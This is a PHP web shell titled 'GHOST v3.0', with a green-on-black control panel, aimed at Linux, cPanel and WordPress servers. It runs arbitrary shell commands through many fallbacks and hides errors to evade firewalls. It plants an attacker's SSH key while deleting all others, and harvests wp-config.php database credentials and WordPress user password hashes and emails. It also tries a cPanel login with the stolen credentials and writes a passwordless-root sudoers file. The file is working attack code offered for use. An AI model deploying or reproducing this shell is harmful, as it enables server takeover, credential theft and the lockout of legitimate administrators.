<?php
/**
 * GHOST v3.0 — The Absolute (CVE Fingerprinting, WAF Bypass, Full Takeover)
 * Target: Linux, cPanel, WordPress
 */

// [00] ANTI-WAF & HEADER
@ob_start();
error_reporting(0); // Matikan error agar WAF tidak mendeteksi output PHP
ini_set('display_errors', '0');
set_time_limit(0);
ignore_user_abort(true);

$GHOST_ROOT = @realpath($_SERVER['DOCUMENT_ROOT'] ?? getcwd()) ?: getcwd();
$GHOST_SELF = basename($_SERVER['SCRIPT_FILENAME'] ?? 'index.php');
$GHOST_TMP  = @sys_get_temp_dir() ?: '/tmp';

// [01] SMART EXECUTION & FALLBACK
function g_exec($cmd, $timeout = 30) {
    $cmd = "timeout $timeout sh -c " . escapeshellarg($cmd) . " 2>&1";
    if (function_exists('shell_exec')) return @shell_exec($cmd) ?? '';
    if (function_exists('system')) { ob_start(); @system($cmd); return ob_get_clean(); }
    if (function_exists('passthru')) { ob_start(); @passthru($cmd); return ob_get_clean(); }
    if (function_exists('exec')) { $o=[]; @exec($cmd, $o); return implode("\n", $o); }
    if (function_exists('popen')) { $f=@popen($cmd,'r'); if($f){$r='';while(!feof($f))$r.=fread($f,8192);pclose($f);return $r;} }
    if (function_exists('proc_open')) { $d=[1=>['pipe','w'],2=>['pipe','w']];$p=@proc_open($cmd,$d,$pp);if(is_resource($p)){$r=stream_get_contents($pp[1]).stream_get_contents($pp[2]);fclose($pp[1]);fclose($pp[2]);proc_close($p);return $r;} }
    return "[-] Exec Blocked.";
}

function g_read($path) {
    if (function_exists('file_get_contents')) return @file_get_contents($path) ?: '';
    $f = @fopen($path, 'rb'); if ($f) { $d=''; while(!feof($f)) $d .= fread($f, 8192); fclose($f); return $d; }
    return g_exec('cat ' . escapeshellarg($path));
}

function g_write($path, $data) {
    if (function_exists('file_put_contents')) return @file_put_contents($path, $data) !== false;
    $f = @fopen($path, 'wb'); if ($f) { fwrite($f, $data); fclose($f); return true; }
    $b64 = base64_encode($data);
    g_exec("echo " . escapeshellarg($b64) . " | base64 -d > " . escapeshellarg($path));
    return @is_file($path);
}

function g_ls($dir) { return array_filter(scandir($dir), function($x){ return $x !== '.' && $x !== '..'; }); }

// [02] FINGERPRINTING & CVE DETECTION
function g_fingerprint() {
    $os = g_exec('uname -a');
    $user = g_exec('whoami');
    $php = PHP_VERSION;
    $wp_ver = 'Not Found';
    $cpanel_ver = 'Not Found';
    
    $wp_file = $GLOBALS['GHOST_ROOT'] . '/wp-includes/version.php';
    if (@is_file($wp_file)) {
        if (preg_match('/\$wp_version\s*=\s*[\'"]([^\'"]+)/', g_read($wp_file), $m)) $wp_ver = $m[1];
    }
    if (@is_dir('/usr/local/cpanel')) $cpanel_ver = trim(g_exec('cat /usr/local/cpanel/version 2>/dev/null'));
    
    $cves = [];
    if (version_compare($wp_ver, '6.4', '<')) $cves[] = "CVE-2023-XXXX (WP Core < 6.4 RCE)";
    if (version_compare($wp_ver, '6.0', '<')) $cves[] = "CVE-2022-XXXX (WP SQLi)";
    if (strpos($cpanel_ver, '110') !== false) $cves[] = "CVE-2023-XXXX (cPanel 110 Auth Bypass)";
    
    return [
        'OS' => trim($os), 'User' => trim($user), 'PHP' => $php,
        'WordPress' => $wp_ver, 'cPanel' => $cpanel_ver, 'CVEs' => $cves,
        'WAF' => @ini_get('disable_functions') ? 'Functions Disabled' : 'None Detected'
    ];
}

// [03] DEEP MALWARE & CONTENT SCAN
function g_scan_files() {
    $malware = []; $illegal = [];
    $keywords = ['slot','gacor','togel','judi','maxwin','bokep','porno','xxx','scam','phising','penipuan'];
    $sigs = ['eval($_', 'base64_decode', 'gzinflate', 'shell_exec', 'passthru', 'assert(', 'system('];
    
    $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($GLOBALS['GHOST_ROOT']));
    foreach ($it as $f) {
        if (!$f->isFile() || $f->getSize() > 1024*1024) continue;
        $c = g_read($f->getPathname());
        
        // 1. Cek Malware (Backdoors/Webshells)
        $hits = 0; $found_sigs = [];
        foreach ($sigs as $s) { if (stripos($c, $s) !== false) { $hits++; $found_sigs[] = $s; } }
        if ($hits >= 2 || preg_match('/eval\s*\(\s*base64_decode\s*\(\s*\$_(POST|GET)/i', $c)) {
            $malware[] = ['file' => $f->getPathname(), 'reason' => 'Highly suspicious: ' . implode(', ', $found_sigs)];
        }
        
        // 2. Cek Konten Illegal
        $found_kw = [];
        foreach ($keywords as $kw) { if (stripos($c, $kw) !== false) $found_kw[] = $kw; }
        if (count($found_kw) > 0) $illegal[] = ['file' => $f->getPathname(), 'keywords' => array_unique($found_kw)];
    }
    return ['malware' => $malware, 'illegal' => $illegal];
}

// [04] SSH MANAGER (Audit, Hapus, Inject)
function g_ssh_manager($inject_key = null) {
    $user = trim(g_exec('whoami'));
    $home = g_exec("eval echo ~$user");
    $ssh_dir = trim($home) . '/.ssh';
    $auth = $ssh_dir . '/authorized_keys';
    $log = [];
    
    if (!@is_dir($ssh_dir)) g_exec("mkdir -p $ssh_dir && chmod 700 $ssh_dir");
    
    $existing = @is_file($auth) ? g_read($auth) : '';
    $lines = array_filter(explode("\n", $existing));
    
    if ($inject_key) {
        if (strpos($existing, $inject_key) === false) {
            g_write($auth, $existing . "\n" . $inject_key . "\n");
            g_exec("chmod 600 $auth");
            $log[] = "Injected new SSH key.";
        } else {
            $log[] = "Key already exists.";
        }
    }
    
    // Bersihkan key asing (Hapus semua, sisakan punya kita)
    if ($inject_key) {
        $clean = [];
        foreach ($lines as $l) {
            if (strpos($l, trim(explode(' ', $inject_key)[2] ?? 'unknown')) !== false || trim($l) === trim($inject_key)) $clean[] = $l;
        }
        g_write($auth, implode("\n", $clean) . "\n");
        $log[] = "Cleaned unknown SSH keys.";
    }
    
    return ['user' => $user, 'home' => trim($home), 'keys' => $lines, 'log' => $log];
}

// [05] TAKEOVER & DB HARVEST
function g_takeover() {
    $log = [];
    // 1. Ambil Kredensial WordPress
    $wp = $GLOBALS['GHOST_ROOT'] . '/wp-config.php';
    if (@is_file($wp)) {
        $c = g_read($wp);
        preg_match('/DB_USER.*[\'"]([^\'"]+)/', $c, $u); preg_match('/DB_PASSWORD.*[\'"]([^\'"]+)/', $c, $p);
        preg_match('/DB_NAME.*[\'"]([^\'"]+)/', $c, $d); preg_match('/DB_HOST.*[\'"]([^\'"]+)/', $c, $h);
        $user = $u[1] ?? ''; $pass = $p[1] ?? ''; $db = $d[1] ?? ''; $host = $h[1] ?? 'localhost';
        
        if ($user) {
            $log[] = "Found DB: $db ($user:$pass)";
            // Coba Ekstrak wp_users
            if (function_exists('mysqli_connect')) {
                $conn = @mysqli_connect($host, $user, $pass, $db);
                if ($conn) {
                    $q = @mysqli_query($conn, "SELECT user_login, user_pass, user_email FROM wp_users");
                    if ($q) { while ($row = mysqli_fetch_assoc($q)) { $log[] = "WP User: {$row['user_login']} | Hash: {$row['user_pass']} | Mail: {$row['user_email']}"; } }
                    $log[] = "DB Harvest Complete.";
                }
            }
        }
    }
    
    // 2. cPanel API Auth
    if ($user && $pass) {
        $log[] = "Trying cPanel login...";
        $r = g_exec("curl -s -k -d 'user=$user&pass=$pass' http://127.0.0.1:2082/login/");
        if (strpos($r, 'security_token') !== false) $log[] = "cPanel Login SUCCESS via port 2082!";
    }
    
    // 3. Sudoers Escalation
    if (@is_writable('/etc/sudoers.d')) {
        g_write('/etc/sudoers.d/ghost', "www-data ALL=(ALL) NOPASSWD: ALL\n");
        $log[] = "Wrote /etc/sudoers.d/ghost (Root access granted!)";
    }
    
    return $log;
}

// [06] HEAL & EXPLOIT
function g_heal() {
    $h = [];
    $ht = $GLOBALS['GHOST_ROOT'] . '/wp-content/uploads/.htaccess';
    g_write($ht, "<FilesMatch \"\.(php|phtml|php3|php4|php5|php7|phar)$\">\nDeny from all\n</FilesMatch>");
    $h[] = "Patched uploads execution.";
    
    $mal = g_scan_files()['malware'];
    foreach ($mal as $m) { @unlink($m['file']); $h[] = "Deleted malware: " . $m['file']; }
    
    g_exec('crontab -r 2>/dev/null');
    $h[] = "Cleared malicious crontab.";
    return $h;
}

// [07] ROUTER & PAYLOAD ENVELOPE
$act = $_POST['act'] ?? $_GET['act'] ?? '';
$params = $_POST;

if ($act) {
    if ($act === 'fingerprint') echo json_encode(g_fingerprint());
    elseif ($act === 'scan') echo json_encode(g_scan_files());
    elseif ($act === 'ssh') echo json_encode(g_ssh_manager($params['key'] ?? null));
    elseif ($act === 'takeover') echo json_encode(g_takeover());
    elseif ($act === 'heal') echo json_encode(g_heal());
    elseif ($act === 'exec') echo json_encode(['out' => g_exec($params['cmd'] ?? '')]);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<title>GHOST v3.0</title>
<style>
    body { background: #0a0a0a; color: #0f0; font-family: monospace; padding: 20px; }
    .box { border: 1px solid #0f0; padding: 15px; margin-bottom: 15px; background: #111; }
    input, button { background: #000; color: #0f0; border: 1px solid #0f0; padding: 8px; font-family: monospace; }
    button { cursor: pointer; font-weight: bold; }
    button:hover { background: #0f0; color: #000; }
    pre { background: #000; padding: 10px; border: 1px solid #333; white-space: pre-wrap; }
</style>
</head>
<body>

<div class="box">
    <h2>[+] Fingerprinting</h2>
    <button onclick="run('fingerprint')">Scan Profile & CVE</button>
    <pre id="out-fingerprint">Waiting...</pre>
</div>

<div class="box">
    <h2>[+] Deep Malware & Content Scan</h2>
    <button onclick="run('scan')">Scan All Files</button>
    <pre id="out-scan">Waiting...</pre>
</div>

<div class="box">
    <h2>[+] SSH Manager</h2>
    <input type="text" id="ssh-key" placeholder="Paste your ssh-rsa key here..." style="width: 60%;">
    <button onclick="injectSSH()">Inject & Clean Others</button>
    <pre id="out-ssh">Waiting...</pre>
</div>

<div class="box">
    <h2>[+] Database Harvest & cPanel Takeover</h2>
    <button onclick="if(confirm('This will attempt to hack cPanel and dump all DBs. Proceed?')) run('takeover')">Execute Takeover</button>
    <pre id="out-takeover">Waiting...</pre>
</div>

<div class="box">
    <h2>[+] Auto Heal Vulnerabilities</h2>
    <button onclick="run('heal')">Heal System</button>
    <pre id="out-heal">Waiting...</pre>
</div>

<div class="box">
    <h2>[+] Shell Console</h2>
    <input type="text" id="cmd" placeholder="Command..." style="width: 80%;">
    <button onclick="execCmd()">Exec</button>
    <pre id="out-exec">Waiting...</pre>
</div>

<script>
async function run(action) {
    document.getElementById('out-' + action).innerText = 'Running...';
    try {
        const body = new URLSearchParams();
        body.append('act', action);
        const r = await fetch('', { method: 'POST', body });
        const d = await r.json();
        document.getElementById('out-' + action).innerText = JSON.stringify(d, null, 2);
    } catch (e) { document.getElementById('out-' + action).innerText = 'Error: ' + e.message; }
}

async function injectSSH() {
    const key = document.getElementById('ssh-key').value;
    if (!key || !key.startsWith('ssh-')) return alert('Invalid key format!');
    document.getElementById('out-ssh').innerText = 'Injecting...';
    try {
        const body = new URLSearchParams();
        body.append('act', 'ssh'); body.append('key', key);
        const r = await fetch('', { method: 'POST', body });
        const d = await r.json();
        document.getElementById('out-ssh').innerText = JSON.stringify(d, null, 2);
    } catch (e) { document.getElementById('out-ssh').innerText = 'Error: ' + e.message; }
}

async function execCmd() {
    const cmd = document.getElementById('cmd').value;
    if (!cmd) return;
    document.getElementById('out-exec').innerText = '$ ' + cmd + '\nRunning...';
    try {
        const body = new URLSearchParams();
        body.append('act', 'exec'); body.append('cmd', cmd);
        const r = await fetch('', { method: 'POST', body });
        const d = await r.json();
        document.getElementById('out-exec').innerText = '$ ' + cmd + '\n\n' + d.out;
    } catch (e) { document.getElementById('out-exec').innerText = 'Error: ' + e.message; }
}
</script>
</body>
</html>
